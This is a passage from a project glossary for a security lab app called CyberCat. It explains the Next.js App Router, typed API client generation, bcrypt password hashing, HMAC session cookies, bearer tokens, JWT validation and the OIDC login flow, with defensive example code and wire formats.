**The render pipeline** for a request to `/incidents/abc-123`:

1. Browser requests the URL. Next.js server matches it to `app/incidents/[id]/page.tsx`.
2. Server starts rendering React. The root `layout.tsx` runs, then `page.tsx`. SCs execute on the server, awaiting data as they go.
3. Where the tree references a CC, the renderer emits a placeholder ("at this position, render component <X> with props <Y>") instead of the component's HTML.
4. Server streams a custom React payload — **NOT plain HTML**, but a structured format that includes: rendered SC HTML, plus a script of "instructions to hydrate these CCs at these positions with these props."
5. Browser receives the streamed payload, paints the SC HTML immediately, then loads the CC bundles, then **hydrates** — attaches React event listeners and state to the static HTML so it becomes interactive.

**The streaming format** is called **RSC payload** (React Server Components wire format). It looks roughly like:

```
0:["$","html",null,{"lang":"en","children":["$","body",null,{"children":["$L1",null,{}]}]}]
1:I["./components/IncidentList.js","IncidentList"]
2:["$","div",null,{"children":[["$","h1",null,{"children":"Incidents"}],["$L1",null,{"items":[...]}]]}]
```

Each line is a chunk; references like `$L1` point to client-component imports. The browser stitches them together as they arrive. This is why SC pages show data above the fold instantly even before all CCs hydrate.

**`"use client"` is contagious going down the import tree, not up.** A file with `"use client"` and everything it imports become CCs. So you put `"use client"` as **low in the tree as possible** — at the leaf interactive component, not at the page level — to keep most of the tree on the server.

**A concrete example:**

```tsx
// app/incidents/[id]/page.tsx — Server Component (no "use client")
import { fetchIncident } from "@/lib/api-server";
import { IncidentDetail } from "./IncidentDetail";  // CC, marked below

export default async function Page({ params }: { params: { id: string } }) {
    const incident = await fetchIncident(params.id);   // runs on server
    return <IncidentDetail incident={incident} />;    // hands data to CC
}
```

```tsx
// app/incidents/[id]/IncidentDetail.tsx — Client Component
"use client";
import { useState } from "react";

export function IncidentDetail({ incident }: { incident: Incident }) {
    const [open, setOpen] = useState(false);            // browser-only state
    return <div onClick={() => setOpen(!open)}>...</div>;
}
```

The `Page` runs once on the server, awaits the incident, and serializes both the rendered HTML *and* the `incident` prop into the RSC payload. The browser receives the HTML, mounts the CC with the prop, and React makes it interactive.

**Layouts** (`layout.tsx`) wrap children and persist across navigations between sibling routes. CyberCat's root layout sets up `SessionProvider` so every page below has access to the current user without each page re-fetching it. Suspense boundaries (via `loading.tsx`) let a slow data fetch on a sub-route stream a skeleton while the rest of the page renders.

**Why it exists:** The old Next.js Pages Router required explicit `getServerSideProps` / `getStaticProps` data-fetching functions — heavy, one-per-page. RSC moves data fetching into components themselves, simplifies the loading/error story (Suspense), and reduces client JS by keeping non-interactive components on the server.

**Where in CyberCat:** `frontend/app/incidents/page.tsx` (list), `frontend/app/incidents/[id]/page.tsx` (detail), `frontend/app/lab/page.tsx`, etc. `layout.tsx` at the root sets up `SessionProvider`. Phase 18 added the `PlainTerm` component (`frontend/app/components/PlainTerm.tsx`) as a client component because it's interactive (hover for technical detail).

**Where else you'll see it:** Remix (similar conventions), SvelteKit, SolidStart — the "file system as router + server-first rendering" pattern is the new mainstream for frontend frameworks.

**Tradeoffs:** The Server / Client component distinction is genuinely confusing on first contact — you can't pass functions or non-serializable data from a server to a client component. Bundle splitting can surprise you if a large dependency gets pulled into a client component accidentally. The frontend image is **baked at build time** (no bind-mount) — code changes require `docker compose build frontend` to take effect (this trips you up often enough that it's in your memory file).

**Related entries:** [openapi-typescript](#openapi-typescript-typed-api-client) · [Server-Sent Events (SSE)](#server-sent-events-sse)

---

#### openapi-typescript (typed API client)
*Introduced: Phase 1 · Category: Frameworks (Frontend)*

**Intuition:** `openapi-typescript` reads an OpenAPI spec (the JSON description of your API that FastAPI generates for free) and emits TypeScript types for every endpoint, request, and response. Your frontend then can't compile if it calls an endpoint that doesn't exist or sends the wrong shape.

**Precise:** OpenAPI 3 is a JSON/YAML schema describing REST APIs — paths, methods, request bodies, response shapes, error envelopes. FastAPI generates this automatically from your Pydantic models and route signatures, served at `GET /openapi.json`. The `openapi-typescript` CLI (`npm run gen:api`) reads that spec and writes a `paths` and `components` types tree to `frontend/app/lib/api.generated.ts`. CyberCat's hand-written `api.ts` wraps `fetch` with these types, giving the frontend compile-time safety against the backend contract.

**How it works (under the hood):**

**The OpenAPI spec** is just a big JSON document describing every endpoint. A trimmed example:

```json
{
  "openapi": "3.1.0",
  "paths": {
    "/v1/incidents/{id}": {
      "get": {
        "operationId": "get_incident",
        "parameters": [{"name": "id", "in": "path", "schema": {"type": "string", "format": "uuid"}}],
        "responses": {
          "200": {"content": {"application/json": {"schema": {"$ref": "#/components/schemas/IncidentDetail"}}}}
        }
      }
    }
  },
  "components": {
    "schemas": {
      "IncidentDetail": {
        "type": "object",
        "properties": {
          "id": {"type": "string", "format": "uuid"},
          "status": {"type": "string", "enum": ["new", "triaged", "investigating", "contained", "resolved", "closed"]},
          "summary": {"type": "string", "nullable": true}
        },
        "required": ["id", "status"]
      }
    }
  }
}
```

**`openapi-typescript`** reads this and emits two big TypeScript types:

```typescript
// frontend/app/lib/api.generated.ts (auto-generated, do not edit)
export interface paths {
  "/v1/incidents/{id}": {
    get: {
      parameters: { path: { id: string } };
      responses: {
        200: { content: { "application/json": components["schemas"]["IncidentDetail"] } };
      };
    };
  };
}

export interface components {
  schemas: {
    IncidentDetail: {
      id: string;
      status: "new" | "triaged" | "investigating" | "contained" | "resolved" | "closed";
      summary?: string | null;
    };
  };
}
```

The `paths` interface is keyed by URL pattern → method → request/response. The `components.schemas` types are referenced anywhere a `$ref` appeared in the spec.

**The hand-written wrapper** in `frontend/app/lib/api.ts` narrows these into ergonomic functions:

```typescript
import type { components } from "./api.generated";

export type IncidentDetail = components["schemas"]["IncidentDetail"];

export async function getIncident(id: string): Promise<IncidentDetail> {
  const res = await fetch(`/v1/incidents/${id}`, { credentials: "include" });
  if (res.status === 401) { window.location.href = "/login"; throw new Error("unauth"); }
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return res.json() as Promise<IncidentDetail>;
}
```

Now anywhere in the frontend, `getIncident(id)` is fully typed: TypeScript knows `incident.status` is one of six strings, `incident.summary` may be null, accessing `incident.bogus_field` is a compile error.

**The regen flow:**

1. Backend changes a model (e.g., adds `Incident.severity_label`).
2. Developer runs `python scripts/dump_openapi.py > openapi.json` against the running stack.
3. Developer runs `npm run gen:api` — `openapi-typescript openapi.json -o frontend/app/lib/api.generated.ts`.
4. TypeScript compilation now flags any frontend code that has the wrong shape.
5. Developer fixes the call sites, commits both `openapi.json` and the regenerated `.ts` file.

**CI's drift check** runs the dump script against a fresh build and `diff`s against the committed `openapi.json`. If they differ, the PR fails — forcing the dev to regenerate before merging.

**Why it exists:** The single biggest source of frontend-backend bugs is the contract drifting silently — backend changes a field name, frontend keeps reading the old one, breakage shows up at runtime in production. Generating types from the source-of-truth spec eliminates the drift: the frontend literally won't compile if the backend has changed shape until you regenerate types and fix the call sites.

**Where in CyberCat:** Spec dump script: `scripts/dump_openapi.py`. Generated types: `frontend/app/lib/api.generated.ts`. Hand-written wrapper: `frontend/app/lib/api.ts`. Regen command: `npm run gen:api` (or `npm run gen:api:file` for offline).

**Where else you'll see it:** Stripe's official SDKs, GitHub's Octokit, AWS SDKs are all generated from OpenAPI/Swagger specs. Equivalents: gRPC's `protoc` generators, GraphQL's `graphql-codegen`, tRPC (no spec — uses TypeScript directly across boundary).

**Tradeoffs:** You have to remember to regenerate after backend changes (CyberCat's CI catches drift by comparing the committed spec to a fresh dump). Types are only as good as the Pydantic models — `Optional[Any]` becomes `unknown` on the frontend, defeating the safety. Some advanced patterns (discriminated unions, polymorphic responses) need careful annotation.

**Related entries:** [FastAPI](#fastapi) · [Pydantic](#pydantic) · [Next.js App Router](#nextjs-app-router)

---

### Auth & security

#### Bcrypt password hashing
*Introduced: Phase 14 · Category: Auth & security*

**Intuition:** Bcrypt is a password hashing algorithm specifically designed to be **slow** — slow enough that even a GPU farm can only try a few thousand guesses per second per stolen hash, instead of billions.

**Precise:** Bcrypt is based on the Blowfish cipher's expensive key-setup phase, parameterized by a "work factor" (CyberCat uses the library default, typically 12). Each `hash(password)` call runs `2^12 = 4096` iterations of an internal mixing function and produces a 60-character output that includes the algorithm version, work factor, a random per-password salt, and the hash itself — all in one string. Verification re-runs the same algorithm with the stored salt and compares.

**How it works (under the hood):**

**The output format** is the most useful thing to recognize on sight:

```
$2b$12$EixZaYVK1fsbw1ZfbX3OXePaWxn96p36WQoeG6Lruj3vjPGga31lW
└─┬─┘└┬┘└────────────────┬────────────────┘└──────────────┬──────────────────┘
  │   │                  │                                 │
  │   │                  └─ 22-char base64 salt           └─ 31-char base64 hash
  │   └─ work factor (cost = 2^12 = 4096 iterations)
  └─ algorithm identifier ($2b$ = current bcrypt variant)
```

This single string is what you store in `users.password_hash`. No separate salt column needed — the salt is part of the hash.

**The hashing algorithm** under the hood:

1. Take the input password (max 72 bytes — bcrypt silently truncates longer inputs, a known footgun).
2. Generate 16 random bytes → that's the **salt**.
3. Run **expensive key setup**: initialize Blowfish's S-boxes and P-array using the password + salt as the key. Repeat this `2^cost` times. This is the slow part — it's intentionally CPU-bound and unparallelizable.
4. Use the resulting state to encrypt a fixed 24-byte plaintext (`"OrpheanBeholderScryDoubt"`) 64 times.
5. Encode the salt + ciphertext as base64 with the format above.

The key property: **every hash takes ~250ms to compute on modern CPU** (at cost=12). Multiply that by however many guesses an attacker wants to make, and you've turned "crack in seconds" into "crack in years."

**Verification step-by-step:**

```python
from passlib.hash import bcrypt

# Hash at user creation (or password change):
stored = bcrypt.hash("hunter2")
# → "$2b$12$EixZaYVK1fsbw1ZfbX3OXEPaWxn96p36WQoeG6Lruj3vjPGga31lW"

# Verify at login:
ok = bcrypt.verify("hunter2", stored)        # True
ok = bcrypt.verify("password", stored)       # False
```

What `bcrypt.verify` does:

1. Parse the stored string → extract algorithm, cost, salt.
2. Run the same hashing algorithm with the input password and the extracted salt.
3. Compare the result to the stored hash byte-by-byte (constant-time comparison to prevent timing attacks).

**Why constant-time comparison matters.** A naive `==` compares byte-by-byte and short-circuits on the first mismatch. An attacker measuring response times could theoretically learn how many bytes match — leaking the hash one byte at a time. `hmac.compare_digest` (used internally) takes the same time regardless of where the mismatch is.

**Concrete CyberCat usage:**

```python
# backend/app/auth/security.py (simplified)
from passlib.context import CryptContext

pwd = CryptContext(schemes=["bcrypt"], deprecated="auto")

def hash_password(plain: str) -> str:
    return pwd.hash(plain)

def verify_password(plain: str, hashed: str) -> bool:
    return pwd.verify(plain, hashed)
```

`CryptContext` is `passlib`'s wrapper that lets you upgrade algorithms (e.g., bcrypt → argon2) without breaking existing hashes — verifies against the algorithm in the stored hash, re-hashes on next login if outdated.

**Why it exists:** Fast hashes (SHA-256, MD5) were never designed for passwords. They're so fast that an attacker who steals your `users` table can crack weak passwords in seconds. Bcrypt (2000) was the first widely-adopted "intentionally slow" hash. Argon2 (2015, the current PHC winner) is the modern recommendation but bcrypt remains battle-tested and fine for most workloads.

**Where in CyberCat:** `backend/app/auth/security.py` — `hash_password(plain) -> str` and `verify_password(plain, hashed) -> bool`. Stored as `users.password_hash` (bytea/text). The `passlib[bcrypt]` library is the binding.

**Where else you'll see it:** Django's default password hasher, Rails' `bcrypt-ruby` gem, Node's `bcrypt` package, every "store passwords correctly" tutorial. Auth0, Cognito, and Supabase all use bcrypt or argon2 under the hood.

**Tradeoffs:** Slow on purpose means slow at login too — a busy login endpoint can become a CPU bottleneck. The work factor is a tuning knob (higher = more secure but slower). Bcrypt has a 72-byte input limit (longer passwords get silently truncated unless you pre-hash with SHA-256, which most libraries don't do — a known footgun).

**Related entries:** [HMAC session cookies](#hmac-session-cookies) · [Bearer tokens](#bearer-tokens-api-tokens)

---

#### HMAC session cookies
*Introduced: Phase 14 · Category: Auth & security*

**Intuition:** An HMAC-signed session cookie is a tiny string the server sends to the browser that says "this user is logged in" — and is signed with a secret key so the user can't forge a different one. The server doesn't need to remember the cookie; it can verify the signature on every request using just the key.

**Precise:** HMAC (Hash-based Message Authentication Code) is a construction that takes a secret key + a message and produces a fixed-size tag (typically SHA-256-based, 32 bytes). Same key + same message = same tag; different message or no key = different tag the verifier rejects. CyberCat uses the `itsdangerous` library's `URLSafeTimedSerializer` to pack `{"user_id": ..., "token_version": ...}` into a base64-encoded payload + HMAC tag + timestamp. The cookie travels via standard `Set-Cookie: HttpOnly; Secure; SameSite=Lax` headers.

**How it works (under the hood):**

**The HMAC construction (RFC 2104).** HMAC is *not* just `SHA256(key + message)` — that has known weaknesses against length-extension attacks. The real formula is:

```
HMAC(key, msg) = SHA256( (key XOR opad) || SHA256( (key XOR ipad) || msg ) )

where:
  ipad = 0x36 repeated to block size (64 bytes for SHA-256)
  opad = 0x5C repeated to block size
  ||   = byte concatenation
```

The double-hash with two different XOR pads is what makes the construction provably secure against length extension. You don't need to memorize the formula — but knowing HMAC is "two SHA passes with key derivations" beats thinking it's a simple hash.

**The cookie format that itsdangerous emits.** A signed session cookie looks like this on the wire:

```
eyJ1c2VyX2lkIjoiNGEyZS0uLi4iLCJ0b2tlbl92ZXJzaW9uIjozfQ.Z5xR_w.qAm9_l_K2Z3xY7vN8TpQ4o0wEhM
└──────────────────────┬──────────────────────┘└──┬──┘└──────────────┬──────────────────┘
              base64-url payload                  │                  │
              {"user_id": "...", "token_version": 3}                 │
                                                   │                  └─ HMAC-SHA256(key, payload + "." + timestamp)
                                                   └─ base64-url unix timestamp (when signed)
```

Three dot-separated parts: payload, timestamp, signature. The payload and timestamp are *not* encrypted — anyone who reads the cookie can decode the JSON. They're just **signed**: the server can verify nobody tampered with them. Don't put secrets in the payload.

**The verify step:**

1. Split the cookie at `.` → get payload, timestamp, signature.
2. Recompute `HMAC-SHA256(secret_key, payload + "." + timestamp)`.
3. Constant-time compare to the presented signature → mismatch = reject.
4. Check the timestamp against `max_age` (e.g., 7 days) → expired = reject.
5. Decode the payload JSON and trust it.

**Concrete CyberCat usage:**

```python
# backend/app/auth/security.py (simplified)
from itsdangerous import URLSafeTimedSerializer, BadSignature, SignatureExpired

serializer = URLSafeTimedSerializer(secret_key=SETTINGS.session_secret, salt="cybercat-session")

def sign_session_cookie(user_id: UUID, token_version: int) -> str:
    return serializer.dumps({"user_id": str(user_id), "token_version": token_version})

def verify_session_cookie(value: str) -> dict | None:
    try:
        return serializer.loads(value, max_age=SETTINGS.session_max_age_seconds)
    except SignatureExpired:
        return None  # too old
    except BadSignature:
        return None  # tampered
```

**The cookie-attribute gauntlet** (the part that's easy to get wrong):

```
Set-Cookie: cybercat_session=<value>; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=604800
```

- `HttpOnly` — JavaScript on the page can't read it (XSS protection).
- `Secure` — only sent over HTTPS (skipped in local dev for HTTP).
- `SameSite=Lax` — not sent on cross-site POSTs (CSRF protection); GET navigations from external sites still send it.
- `Path=/` — sent on every URL on the domain.
- `Max-Age=604800` — browser deletes it after 7 days.

**Why `token_version` matters.** It's stored both in the cookie payload AND on `users.token_version` in the DB. Login dependency reads the user, compares versions: if cookie's < DB's, reject. To force-logout a user globally (compromised account, password change), bump their `token_version` → every cookie they're holding fails verification on the next request. This is the answer to "stateless can't be revoked" — you can revoke *all* of a user's sessions at once with one DB write.

**Why it exists:** The alternative is server-side session storage — every login writes to Redis or a `sessions` table, every request looks up the cookie's session ID. That works but requires DB/Redis on every authenticated request. HMAC cookies are *stateless*: the server only needs the secret key to verify; no DB hit, scales horizontally for free. The `token_version` field lets you globally invalidate sessions (bump the user's version → all old cookies fail verification).

**Where in CyberCat:** `backend/app/auth/security.py` — `sign_session_cookie(payload)`, `verify_session_cookie(value)`. Set on `POST /v1/auth/login`, cleared on `POST /v1/auth/logout`. Read by `get_current_user` dependency in `backend/app/auth/dependencies.py`.

**Where else you'll see it:** Flask's `session` (signed by default), Django's signed cookies, Rails' encrypted+signed cookies, Phoenix's `Plug.Session.COOKIE`. JWTs (next entry) are a fancier version of the same idea.

**Tradeoffs:** Stateless = great for scaling, but you can't *immediately* invalidate a single session without storing something server-side (the `token_version` bump invalidates *all* of a user's sessions, not one). Cookie size grows with payload — keep it small. The secret key is the entire security budget — rotate it carefully (CyberCat supports key rotation via a `previous_key` list in `itsdangerous`).

**Related entries:** [JWT (JSON Web Tokens)](#jwt-json-web-tokens) · [Bearer tokens](#bearer-tokens-api-tokens)

---

#### Bearer tokens (API tokens)
*Introduced: Phase 14 · Category: Auth & security*

**Intuition:** A Bearer token is a long random string the client sends in an `Authorization: Bearer <token>` header on every request. Whoever holds the token *is* the user — there's no per-request login flow.

**Precise:** Per RFC 6750, the Bearer authentication scheme means "possession of the token grants access; the server doesn't verify *who* presented it, only *that* it's valid." CyberCat generates 32-byte random tokens (`secrets.token_urlsafe(32)`), stores **only the SHA-256 hash** in `api_tokens.token_hash`, and returns the plaintext exactly once at creation. On each request, the server hashes the presented token and looks up the row — zero plaintext storage.

**How it works (under the hood):**

**Token generation.** `secrets.token_urlsafe(32)` produces 32 cryptographically-random bytes encoded as URL-safe base64 (no `+` / `/` / `=` characters that need URL escaping). The output is a 43-character ASCII string like `xPjQ7y0vM3nX5kRz9aTbEoLp2hWuD8gK4lF6cIqYsNeWqVi`. 32 bytes = 256 bits of entropy = unguessable.

**The wire format** of a Bearer-authenticated request:

```
GET /v1/incidents HTTP/1.1
Host: cybercat.local:8080
Authorization: Bearer xPjQ7y0vM3nX5kRz9aTbEoLp2hWuD8gK4lF6cIqYsNeWqVi
Content-Type: application/json
```

The `Authorization` header always starts with the scheme name (`Bearer`), a space, then the token. The server splits on the first space.

**Why hash before storing?** If your `api_tokens` table is leaked (SQL injection, backup escape, insider threat), the attacker has the *hashes*. To use a hash they'd need to find a 256-bit-entropy preimage — not feasible with current cryptography. Compare to storing plaintext: leaked table = instant takeover of every account.

**SHA-256 vs bcrypt for tokens** (an important distinction). Passwords are hashed with bcrypt because passwords have *low entropy* (humans pick `hunter2`); slow hashing buys time against brute-force guessing. API tokens have *high entropy* (32 random bytes); even SHA-256 is uncrackable. So bcrypt would just slow down every request for no security gain. Use bcrypt for human-chosen secrets, SHA-256 (or HMAC) for machine-generated ones.

**The full lifecycle in CyberCat:**

```python
# Creation — POST /v1/auth/tokens
import secrets, hashlib

def create_api_token(user_id: UUID, name: str) -> tuple[ApiToken, str]:
    plaintext = secrets.token_urlsafe(32)
    digest = hashlib.sha256(plaintext.encode()).digest()
    row = ApiToken(user_id=user_id, name=name, token_hash=digest)
    db.add(row)
    db.commit()
    return row, plaintext   # plaintext returned ONCE; never readable again
```

Response body:

```json
{
  "id": "9c4d-...",
  "name": "agent on lab-debian",
  "token": "xPjQ7y0vM3nX5kRz9aTbEoLp2hWuD8gK4lF6cIqYsNeWqVi",
  "created_at": "2026-04-28T12:00:00Z"
}
```

The `"token"` field is shown to the user once; the UI tells them to copy it now. Subsequent calls to list tokens never include it — only `id`, `name`, `last_used_at`.

```python
# Authentication on every request — backend/app/auth/dependencies.py
from hmac import compare_digest

async def get_current_user(request: Request, db: AsyncSession) -> User | None:
    # Try cookie first
    cookie = request.cookies.get("cybercat_session")
    if cookie:
        payload = verify_session_cookie(cookie)
        if payload:
            return await db.get(User, payload["user_id"])

    # Fall back to bearer
    auth = request.headers.get("Authorization", "")
    if auth.startswith("Bearer "):
        plaintext = auth.removeprefix("Bearer ").strip()
        digest = hashlib.sha256(plaintext.encode()).digest()
        # Look up by hash; SQLAlchemy emits parameterized SQL → no SQL injection
        row = (await db.execute(
            select(ApiToken).where(ApiToken.token_hash == digest, ApiToken.revoked_at.is_(None))
        )).scalar_one_or_none()
        if row:
            row.last_used_at = func.now()   # bookkeeping
            return await db.get(User, row.user_id)

    return None
```

**The `cct-agent` token bootstrap.** On first stack-up, `start.sh` checks for a `CCT_AGENT_TOKEN` env var. If absent, it calls `POST /v1/auth/tokens` (with admin credentials), captures the returned plaintext, writes it to the cct-agent's environment, and never sees the plaintext again. Every subsequent agent → backend POST carries `Authorization: Bearer <token>`.

**Why it exists:** Cookies tie auth to a browser session. Bearer tokens let scripts, CI, the agent, mobile apps — anything that can set HTTP headers — authenticate without a login flow. The "hash, don't store plaintext" rule is the same defense-in-depth principle as bcrypting passwords: a leaked database doesn't yield usable tokens.

**Where in CyberCat:** `backend/app/auth/models.py` — `ApiToken` model. `backend/app/auth/router.py` — `POST /v1/auth/tokens` (create, returns plaintext once), `DELETE /v1/auth/tokens/{id}` (revoke). `backend/app/auth/dependencies.py` — `get_current_user` falls back to bearer if no session cookie. The cct-agent uses one (`CCT_AGENT_TOKEN`, bootstrapped by `start.sh`).

**Where else you'll see it:** GitHub PATs (Personal Access Tokens), Stripe API keys, AWS access keys, every modern REST API. OAuth 2 access tokens are also Bearer tokens (with extra metadata about scope and expiry).

**Tradeoffs:** A leaked Bearer token = full account takeover until it's revoked (no second factor). Best practice is **short-lived tokens with refresh** (OAuth 2 pattern); CyberCat's tokens don't expire by default, which is fine for a lab tool but wouldn't fly in production. Tokens in URL query strings get logged — always use the `Authorization` header.

**Related entries:** [HMAC session cookies](#hmac-session-cookies) · [JWT (JSON Web Tokens)](#jwt-json-web-tokens)

---

#### JWT (JSON Web Tokens)
*Introduced: Phase 14.4 (OIDC) · Category: Auth & security*

**Intuition:** A JWT is a self-contained claim ("user X, email Y, expires at Z") that is signed by an issuer (an identity provider like Google or Okta) and verifiable by anyone holding the issuer's public key. The receiving server doesn't need to call the issuer back — it just checks the signature.

**Precise:** A JWT (RFC 7519) is three base64-url-encoded segments joined by dots: `header.payload.signature`. The header names the algorithm (e.g., `RS256` = RSA + SHA-256). The payload is JSON containing standard claims (`iss` issuer, `sub` subject, `aud` audience, `exp` expiry, `iat` issued-at) plus custom fields (`email`, `name`). The signature is computed over `base64(header) + "." + base64(payload)` using the issuer's private key. Verification: fetch the issuer's public keys from its JWKS (JSON Web Key Set) endpoint, recompute the signature, check it matches, then validate the claims.

**How it works (under the hood):**

**A real JWT, decoded.** Take this token (broken across lines for readability):

```
eyJhbGciOiJSUzI1NiIsImtpZCI6IjE0In0.
eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJzdWIiOiIxMTAxNjk0ODQ0NDc0Mzg2NDc4NTIiLCJhdWQiOiJjeWJlcmNhdC1jbGllbnQtaWQiLCJpYXQiOjE3MzU2ODk2MDAsImV4cCI6MTczNTY5MzIwMCwibm9uY2UiOiJyYW5kb20tNDIiLCJlbWFpbCI6Im96aWVsQGV4YW1wbGUuY29tIn0.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Three dot-separated base64-url segments. Decoded:

| Segment | Bytes | Decoded |
|---|---|---|
| Header | `eyJhbGciOiJSUzI1NiIsImtpZCI6IjE0In0` | `{"alg":"RS256","kid":"14"}` |
| Payload | `eyJpc3MiOiJodHRwczovL2...` | `{"iss":"https://accounts.google.com", "sub":"110169484447438647852", "aud":"cybercat-client-id", "iat":1735689600, "exp":1735693200, "nonce":"random-42", "email":"oziel@example.com"}` |
| Signature | `SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c` | (binary RSA signature, base64-url encoded) |

Anyone can decode this with a base64 decoder — that's why **JWT payloads are not secret**. Don't put credit card numbers in there. The signature is the only thing protecting against tampering.

**The standard claims** (memorize these — they appear in every JWT):

| Claim | Means | Example |
|---|---|---|
| `iss` | Issuer (who minted this token) | `"https://accounts.google.com"` |
| `sub` | Subject (the user's stable ID at the IdP) | `"110169484447438647852"` |
| `aud` | Audience (which service this token is for) | `"cybercat-client-id"` |
| `iat` | Issued-at (Unix timestamp) | `1735689600` |
| `exp` | Expires-at (Unix timestamp) | `1735693200` |
| `nonce` | Replay-protection value (chosen by client at /authorize) | `"random-42"` |

**Base64-url encoding** is regular base64 with two substitutions: `+` → `-`, `/` → `_`, and trailing `=` padding stripped. This makes the result safe to drop into URLs and HTTP headers without escaping.

**HS256 vs RS256 (the critical security distinction):**

- **HS256 (HMAC-SHA256)** — symmetric. Signing key = verifying key. Both parties must share the secret. Cheap to compute. Only useful when issuer and verifier are the same party (e.g., your own backend issuing tokens to its own frontend).
- **RS256 (RSA-SHA256)** — asymmetric. Signing key (private) is held by issuer; verifying key (public) is published. Anyone can verify, only the issuer can sign. This is what OIDC providers use — they publish the public key at the JWKS endpoint, every relying party can validate without ever holding the private key.

**JWKS (JSON Web Key Set).** The IdP exposes a URL like `https://accounts.google.com/jwks` returning a JSON document like:

```json
{
  "keys": [
    {"kid": "14", "kty": "RSA", "use": "sig", "alg": "RS256",
     "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86z..."  /* RSA modulus */,
     "e": "AQAB"  /* RSA exponent */ }
  ]
}
```

Each key has a `kid` (key ID). The JWT header carries the `kid` of the key used to sign it. Validation step 1: look up the key from the JWKS by `kid`. This lets the IdP rotate keys (publish new ones, retire old ones) without breaking validation.

**The validation algorithm step-by-step:**

1. Split the JWT at `.` → header_b64, payload_b64, sig_b64.
2. Decode header → get `alg` and `kid`.
3. Reject if `alg` is `"none"` or doesn't match expected (defense against `alg` confusion attacks).
4. Fetch JWKS (cached); look up the public key by `kid`.
5. Recompute signature: take `header_b64 + "." + payload_b64`, sign with the public key. Compare to `sig_b64`. Mismatch = reject.
6. Decode payload → get claims.
7. Verify `exp` > now (not expired).
8. Verify `iss` matches the expected issuer.
9. Verify `aud` matches your client_id.
10. Verify `nonce` matches the value you set at /authorize (replay protection).
11. Trust the payload.

**CyberCat's usage:**

```python
# backend/app/auth/oidc.py (simplified)
from authlib.jose import jwt as jose_jwt

def validate_id_token(id_token: str, expected_nonce: str) -> dict:
    claims = jose_jwt.decode(
        id_token,
        oidc_config.jwks,                       # cached at startup
        claims_options={
            "iss": {"essential": True, "value": SETTINGS.oidc_issuer},
            "aud": {"essential": True, "value": SETTINGS.oidc_client_id},
            "nonce": {"essential": True, "value": expected_nonce},
        },
    )
    claims.validate()                            # checks exp, iat, nbf
    return claims
```

`authlib` does steps 1–11 above; you just supply the JWKS and the expected values.

**Why it exists:** Federated identity. Without JWTs, every service needs to call back to the identity provider for every request to verify "is this user logged in?" — a giant scaling and reliability problem. JWTs let the IdP issue a token once, the receiving service verifies it offline, and the user proves identity across many services without round-tripping.

**Where in CyberCat:** `backend/app/auth/oidc.py` — `exchange_code_for_user_info(code)` calls the IdP's token endpoint and uses `authlib.jose.jwt.decode(id_token, jwks)` to validate the returned ID token. CyberCat does *not* mint its own JWTs; it consumes them from OIDC providers (Google, Okta, Auth0, Keycloak) and translates verified identities into local users via JIT (just-in-time) provisioning.

**Where else you'll see it:** Auth0, Okta, Keycloak, Google Workspace, AWS Cognito all issue JWTs. Cloudflare Workers JWT, Firebase ID tokens, Supabase auth — all JWTs underneath.

**Tradeoffs:** Stateless = can't be revoked instantly (you wait for `exp`). Mitigated by short expiry + refresh tokens. The classic footgun: accepting `alg: none` (unsigned) tokens or confusing `HS256` (symmetric) with `RS256` (asymmetric) — both have caused real breaches; `authlib` defends against them. JWT payloads are *visible*, just not forgeable — never put secrets in them.

**Related entries:** [OIDC (OpenID Connect)](#oidc-openid-connect) · [HMAC session cookies](#hmac-session-cookies)

---

#### OIDC (OpenID Connect)
*Introduced: Phase 14.4 · Category: Auth & security*

**Intuition:** OIDC is "OAuth 2 with identity bolted on" — the standard protocol that lets you click "Sign in with Google" on any third-party site and end up logged in without sharing your password.

**Precise:** OIDC (2014 spec) sits on top of OAuth 2. The flow CyberCat uses is **Authorization Code with PKCE-friendly state**: (1) backend generates a random `state` + `nonce`, signs them into a cookie, and redirects the browser to the IdP's `/authorize` endpoint with the app's `client_id` and `redirect_uri`; (2) user logs in at the IdP, IdP redirects browser back to `/v1/auth/oidc/callback?code=...&state=...`; (3) backend verifies `state` matches the signed cookie, exchanges the `code` for an ID token (a JWT) at the IdP's token endpoint; (4) backend validates the JWT signature against the IdP's JWKS and matches the `nonce` claim; (5) backend looks up or JIT-creates the local user and issues its own session cookie.

**How it works (under the hood):**

**The four parties** in the dance:

- **User** — sitting at the browser.
- **User Agent** — the browser itself, executing redirects.
- **Relying Party (RP)** — that's CyberCat, the app that wants to log the user in.
- **Identity Provider (IdP)** — Google / Okta / Auth0, the party that knows who the user is.

**The full flow with actual HTTP traffic.** Click "Sign in with Google":

**Step 1** — Browser → CyberCat:
```
GET /v1/auth/oidc/login HTTP/1.1
```

CyberCat generates random values:
```python
state = secrets.token_urlsafe(16)        # CSRF defense — round-trips to confirm the callback is the one we kicked off
nonce = secrets.token_urlsafe(16)        # replay defense — embedded in the JWT; we'll verify it came back
```

**Step 2** — CyberCat → Browser (set the signed cookie + redirect):
```
HTTP/1.1 303 See Other
Set-Cookie: oidc_state=<itsdangerous-signed {state, nonce, return_to: "/incidents"}>; HttpOnly; Secure; SameSite=Lax
Location: https://accounts.google.com/o/oauth2/v2/auth?
  response_type=code&
  client_id=cybercat-client-id&
  redirect_uri=https%3A%2F%2Fcybercat.local%2Fv1%2Fauth%2Foidc%2Fcallback&
  scope=openid+email+profile&
  state=<state>&
  nonce=<nonce>
```

The signed cookie is the binding: only this browser can later present the matching state value because only this browser holds the cookie. The `state` in the URL is what the IdP will echo back.

**Step 3** — Browser follows the redirect to Google. User logs in at Google's UI.

**Step 4** — Google → Browser (redirect back with a code):
```
HTTP/1.1 303 See Other
Location: https://cybercat.local/v1/auth/oidc/callback?code=4/0AVMBs...&state=<same state from step 2>
```

The `code` is a short-lived (~10 min) opaque value. It's not a token; it's a one-time-use ticket the RP redeems for the actual tokens.

**Step 5** — Browser → CyberCat:
```
GET /v1/auth/oidc/callback?code=4/0AVMBs...&state=<state>
Cookie: oidc_state=<the signed cookie from step 2>
```

CyberCat:
1. Reads the `oidc_state` cookie, verifies the itsdangerous signature, extracts `{state, nonce, return_to}`.
2. Compares query-string `state` to cookie `state`. Mismatch = abort (someone forged a callback).
